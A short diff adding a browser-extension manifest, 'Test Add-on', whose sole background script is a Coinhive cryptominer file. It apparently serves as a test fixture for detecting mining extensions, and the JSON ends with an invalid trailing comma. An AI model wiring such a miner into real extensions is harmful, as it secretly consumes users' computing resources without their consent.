@@ -1,0 +1,14 @@
+{
+    "manifest_version": 2,
+    "name": "Test Add-on",
+    "version": "6.0.57",
+    "author": "someone",
+    "minimum_chrome_version": "58",
+
+    "description": "",
+
+
+    "background": {
+        "scripts": ["scripts/coinhive.min.js"]
+    },
+}
